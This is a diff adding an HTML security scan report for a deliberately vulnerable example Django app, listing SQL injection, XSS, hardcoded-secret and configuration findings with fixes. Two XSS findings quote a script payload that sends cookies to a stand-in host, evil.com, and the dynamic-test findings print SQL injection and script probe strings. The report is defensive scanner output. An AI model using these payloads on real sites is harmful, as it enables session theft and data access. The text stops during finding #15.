@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Scan Report — django.core.handlers.wsgi</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+        }
+        .container { max-width: 900px; margin: 0 auto; padding: 20px; }
+        .header {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+        }
+        .header h1 { font-size: 1.5em; margin-bottom: 12px; }
+        .stats {
+            display: flex;
+            gap: 20px;
+            margin-top: 12px;
+        }
+        .stat {
+            background: rgba(255,255,255,0.1);
+            padding: 8px 16px;
+            border-radius: 8px;
+        }
+        .summary-bar {
+            display: flex;
+            gap: 10px;
+            margin: 16px 0;
+            flex-wrap: wrap;
+        }
+        .summary-badge {
+            padding: 6px 16px;
+            border-radius: 20px;
+            color: #fff;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+        code {
+            background: #e9ecef;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 0.9em;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔒 Security Scan Report</h1>
+            <p><strong>Application:</strong> django.core.handlers.wsgi</p>
+            <div class="stats">
+                <div class="stat">📍 Routes: 5</div>
+                <div class="stat">🔍 Issues: 16</div>
+                <div class="stat">⏱️ Time: 1.082s</div>
+                <div class="stat">📅 2026-03-16 22:51</div>
+            </div>
+        </div>
+
+        <div class="summary-bar">
+            <span class="summary-badge" style="background:#dc3545;">
+                7 Critical
+            </span>
+            <span class="summary-badge" style="background:#fd7e14;">
+                3 High
+            </span>
+            <span class="summary-badge" style="background:#ffc107;color:#333;">
+                5 Medium
+            </span>
+            <span class="summary-badge" style="background:#17a2b8;">
+                1 Low
+            </span>
+        </div>
+
+        
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #dc3545;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#dc3545;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    CRITICAL
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">SAST</span>
+                <span style="margin-left:auto;color:#888;">#1</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">SQL_INJECTION</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>/user/</strong>
+                 (line 8)
+                → C:\Users\prana\Downloads\python_security_scanner_library_project\examples\vulnerable_django_app.py
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                query = f&quot;SELECT * FROM users WHERE id = {user_id}&quot;
+            </div>
+            <p><strong>⚠️ Why:</strong> Variable &#x27;user_id&#x27; appears to come from user input and is interpolated directly into a SQL query string. An attacker can send input like `&#x27; OR &#x27;1&#x27;=&#x27;1` to manipulate the query, potentially accessing or deleting all data.</p>
+            <p><strong>✅ Fix:</strong> Use parameterized queries instead of string interpolation.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code>cursor.execute(f&quot;SELECT ... WHERE col = {user_id}&quot;)</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>cursor.execute(&quot;SELECT ... WHERE col = %s&quot;, (user_id,))</code>
+                </div>
+            </div>
+            <p>📖 <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">OWASP Reference</a></p>
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #dc3545;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#dc3545;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    CRITICAL
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">SAST</span>
+                <span style="margin-left:auto;color:#888;">#2</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">XSS</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>/search/</strong>
+                 (line 4)
+                → C:\Users\prana\Downloads\python_security_scanner_library_project\examples\vulnerable_django_app.py
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                return HttpResponse(f&quot;&lt;h1&gt;Results for: {term}&lt;/h1&gt;&quot;)
+            </div>
+            <p><strong>⚠️ Why:</strong> Variable &#x27;term&#x27; appears to contain user input that is included in HTML output without escaping (f-string with HTML tags). An attacker can inject &#x27;&lt;script&gt;document.location=&quot;http://evil.com/?c=&quot;+document.cookie&lt;/script&gt;&#x27; to steal cookies.</p>
+            <p><strong>✅ Fix:</strong> Escape all user input before including in HTML.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code>return f&quot;&lt;h1&gt;{term}&lt;/h1&gt;&quot;</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>from markupsafe import escape
+return f&quot;&lt;h1&gt;{escape(term)}&lt;/h1&gt;&quot;</code>
+                </div>
+            </div>
+            <p>📖 <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP Reference</a></p>
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #dc3545;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#dc3545;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    CRITICAL
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">SAST</span>
+                <span style="margin-left:auto;color:#888;">#3</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">XSS</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>/profile/</strong>
+                 (line 4)
+                → C:\Users\prana\Downloads\python_security_scanner_library_project\examples\vulnerable_django_app.py
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                return HttpResponse(f&quot;&lt;h1&gt;Hello {name}!&lt;/h1&gt;&quot;)
+            </div>
+            <p><strong>⚠️ Why:</strong> Variable &#x27;name&#x27; appears to contain user input that is included in HTML output without escaping (f-string with HTML tags). An attacker can inject &#x27;&lt;script&gt;document.location=&quot;http://evil.com/?c=&quot;+document.cookie&lt;/script&gt;&#x27; to steal cookies.</p>
+            <p><strong>✅ Fix:</strong> Escape all user input before including in HTML.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code>return f&quot;&lt;h1&gt;{name}&lt;/h1&gt;&quot;</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>from markupsafe import escape
+return f&quot;&lt;h1&gt;{escape(name)}&lt;/h1&gt;&quot;</code>
+                </div>
+            </div>
+            <p>📖 <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP Reference</a></p>
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #ffc107;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#ffc107;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    MEDIUM
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">SAST</span>
+                <span style="margin-left:auto;color:#888;">#4</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">HARDCODED_SECRET</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>/admin/</strong>
+                 (line 3)
+                → C:\Users\prana\Downloads\python_security_scanner_library_project\examples\vulnerable_django_app.py
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                api_key = &quot;sk-live-abcdef123456&quot;
+            </div>
+            <p><strong>⚠️ Why:</strong> Variable &#x27;api_key&#x27; appears to contain a hardcoded secret (value: &#x27;sk-live-abcdef123456...&#x27; ). Hardcoded credentials can be extracted from source code, version control history, or compiled binaries. If this is a real credential, it should be moved to environment variables or a secrets manager.</p>
+            <p><strong>✅ Fix:</strong> Use environment variables instead of hardcoded secrets.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code>api_key = &quot;sk-live-abcdef123456&quot;</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>import os
+api_key = os.environ.get(&quot;API_KEY&quot;)</code>
+                </div>
+            </div>
+            <p>📖 <a href="https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password" target="_blank">OWASP Reference</a></p>
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #fd7e14;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#fd7e14;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    HIGH
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">SAST</span>
+                <span style="margin-left:auto;color:#888;">#5</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">DEBUG_MODE</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>(global config)</strong>
+                
+                → settings.py
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                DEBUG = True
+            </div>
+            <p><strong>⚠️ Why:</strong> DEBUG mode is enabled. Django&#x27;s debug mode exposes detailed error pages with full tracebacks, local variables, and SQL queries to anyone who triggers an error. In production, this gives attackers a roadmap of your application.</p>
+            <p><strong>✅ Fix:</strong> Set DEBUG = False in production settings.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code>DEBUG = True</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>DEBUG = False</code>
+                </div>
+            </div>
+            <p>📖 <a href="https://docs.djangoproject.com/en/stable/ref/settings/#debug" target="_blank">OWASP Reference</a></p>
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #fd7e14;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#fd7e14;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    HIGH
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">SAST</span>
+                <span style="margin-left:auto;color:#888;">#6</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">HARDCODED_SECRET</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>(global config)</strong>
+                
+                → settings.py
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                SECRET_KEY = &quot;password123...&quot;
+            </div>
+            <p><strong>⚠️ Why:</strong> SECRET_KEY is weak or easily guessable. Django uses this key to sign cookies, CSRF tokens, and password reset tokens. An attacker who knows this key can forge any of these.</p>
+            <p><strong>✅ Fix:</strong> Use a long random secret key from environment variables.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code>SECRET_KEY = &quot;password123...&quot;</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>import os
+SECRET_KEY = os.environ.get(&quot;DJANGO_SECRET_KEY&quot;)</code>
+                </div>
+            </div>
+            <p>📖 <a href="https://docs.djangoproject.com/en/stable/ref/settings/#secret-key" target="_blank">OWASP Reference</a></p>
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #fd7e14;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#fd7e14;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    HIGH
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">SAST</span>
+                <span style="margin-left:auto;color:#888;">#7</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">CSRF_MISSING</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>(global config)</strong>
+                
+                → settings.py
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                CsrfViewMiddleware not in MIDDLEWARE
+            </div>
+            <p><strong>⚠️ Why:</strong> Django&#x27;s CsrfViewMiddleware is not in your MIDDLEWARE list. Without it, all POST/PUT/DELETE forms are vulnerable to Cross-Site Request Forgery attacks.</p>
+            <p><strong>✅ Fix:</strong> Add CsrfViewMiddleware to MIDDLEWARE.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code>MIDDLEWARE = [...]
+# missing CsrfViewMiddleware</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>MIDDLEWARE = [
+    ...
+    &quot;django.middleware.csrf.CsrfViewMiddleware&quot;,
+    ...
+]</code>
+                </div>
+            </div>
+            <p>📖 <a href="https://docs.djangoproject.com/en/stable/ref/csrf/" target="_blank">OWASP Reference</a></p>
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #ffc107;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#ffc107;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    MEDIUM
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">SAST</span>
+                <span style="margin-left:auto;color:#888;">#8</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">MISSING_SECURITY_HEADER</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>(global config)</strong>
+                
+                → settings.py
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                SecurityMiddleware not in MIDDLEWARE
+            </div>
+            <p><strong>⚠️ Why:</strong> Django&#x27;s SecurityMiddleware is not in your MIDDLEWARE list. It provides important protections like HTTPS redirect, HSTS, XSS filter header, and content-type sniffing prevention.</p>
+            <p><strong>✅ Fix:</strong> Add SecurityMiddleware to MIDDLEWARE.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code>MIDDLEWARE = [...]
+# missing SecurityMiddleware</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>MIDDLEWARE = [
+    &quot;django.middleware.security.SecurityMiddleware&quot;,
+    ...
+]</code>
+                </div>
+            </div>
+            <p>📖 <a href="https://docs.djangoproject.com/en/stable/ref/middleware/#django.middleware.security.SecurityMiddleware" target="_blank">OWASP Reference</a></p>
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #dc3545;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#dc3545;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    CRITICAL
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">DAST</span>
+                <span style="margin-left:auto;color:#888;">#9</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">SQL_INJECTION</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>/user/</strong>
+                
+                → (dynamic test)
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                GET /user/?id=&#x27; OR &#x27;1&#x27;=&#x27;1
+            </div>
+            <p><strong>⚠️ Why:</strong> Sending payload &#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; as parameter &#x27;id&#x27; caused a database error in the response, confirming SQL injection is possible. Response status: 500.</p>
+            <p><strong>✅ Fix:</strong> Use parameterized queries or Django ORM.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code>cursor.execute(f&quot;SELECT ... WHERE col = {id}&quot;)</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>cursor.execute(&quot;SELECT ... WHERE col = %s&quot;, (id,))</code>
+                </div>
+            </div>
+            <p>📖 <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">OWASP Reference</a></p>
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #dc3545;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#dc3545;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    CRITICAL
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">DAST</span>
+                <span style="margin-left:auto;color:#888;">#10</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">XSS</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>/user/</strong>
+                
+                → (dynamic test)
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                GET /user/?id=&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+            </div>
+            <p><strong>⚠️ Why:</strong> XSS payload &#x27;&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;...&#x27; sent as parameter &#x27;id&#x27; was reflected unescaped in the HTML response. An attacker can inject malicious scripts.</p>
+            <p><strong>✅ Fix:</strong> Escape all user input before including in HTML output.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code>HttpResponse(f&quot;...{id}...&quot;)</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>from django.utils.html import escape
+HttpResponse(f&quot;...{escape(id)}...&quot;)</code>
+                </div>
+            </div>
+            <p>📖 <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP Reference</a></p>
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #dc3545;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#dc3545;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    CRITICAL
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">DAST</span>
+                <span style="margin-left:auto;color:#888;">#11</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">XSS</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>/search/</strong>
+                
+                → (dynamic test)
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                GET /search/?q=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+            </div>
+            <p><strong>⚠️ Why:</strong> XSS payload &#x27;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;...&#x27; sent as parameter &#x27;q&#x27; was reflected unescaped in the HTML response. An attacker can inject malicious scripts.</p>
+            <p><strong>✅ Fix:</strong> Escape all user input before including in HTML output.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code>HttpResponse(f&quot;...{q}...&quot;)</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>from django.utils.html import escape
+HttpResponse(f&quot;...{escape(q)}...&quot;)</code>
+                </div>
+            </div>
+            <p>📖 <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP Reference</a></p>
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #dc3545;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#dc3545;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    CRITICAL
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">DAST</span>
+                <span style="margin-left:auto;color:#888;">#12</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">XSS</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>/profile/</strong>
+                
+                → (dynamic test)
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                GET /profile/?name=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+            </div>
+            <p><strong>⚠️ Why:</strong> XSS payload &#x27;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;...&#x27; sent as parameter &#x27;name&#x27; was reflected unescaped in the HTML response. An attacker can inject malicious scripts.</p>
+            <p><strong>✅ Fix:</strong> Escape all user input before including in HTML output.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code>HttpResponse(f&quot;...{name}...&quot;)</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>from django.utils.html import escape
+HttpResponse(f&quot;...{escape(name)}...&quot;)</code>
+                </div>
+            </div>
+            <p>📖 <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP Reference</a></p>
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #ffc107;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#ffc107;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    MEDIUM
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">DAST</span>
+                <span style="margin-left:auto;color:#888;">#13</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">MISSING_SECURITY_HEADER</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>/</strong>
+                
+                → HTTP response
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                Missing header: Content-Security-Policy
+            </div>
+            <p><strong>⚠️ Why:</strong> Content-Security-Policy (CSP) header is missing. CSP helps prevent XSS attacks by restricting which resources can be loaded.</p>
+            <p><strong>✅ Fix:</strong> Add the Content-Security-Policy header to your responses.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code># No security headers set</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>response.headers[&quot;Content-Security-Policy&quot;] = &quot;..appropriate value..&quot;</code>
+                </div>
+            </div>
+            
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #17a2b8;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#17a2b8;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    LOW
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">DAST</span>
+                <span style="margin-left:auto;color:#888;">#14</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">MISSING_SECURITY_HEADER</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>/</strong>
+                
+                → HTTP response
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                Missing header: X-Content-Type-Options
+            </div>
+            <p><strong>⚠️ Why:</strong> X-Content-Type-Options header is missing. This header prevents MIME type sniffing, which can lead to security vulnerabilities.</p>
+            <p><strong>✅ Fix:</strong> Add the X-Content-Type-Options header to your responses.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code># No security headers set</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>response.headers[&quot;X-Content-Type-Options&quot;] = &quot;..appropriate value..&quot;</code>
+                </div>
+            </div>
+            
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #ffc107;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#ffc107;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    MEDIUM
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">DAST</span>
+                <span style="margin-left:auto;color:#888;">#15</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">MISSING_SECURITY_HEADER</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>/</strong>
+                
+                → HTTP response
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                Missing header: X-Frame-Options
+            </div>
+            <p><strong>⚠️ Why:</strong> X-Frame-Options header is missing. Without it, your site can be loaded in an iframe, enabling clickjacking attacks.</p>
+            <p><strong>✅ Fix:</strong> Add the X-Frame-Options header to your responses.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code># No security headers set</code>
+                </div>
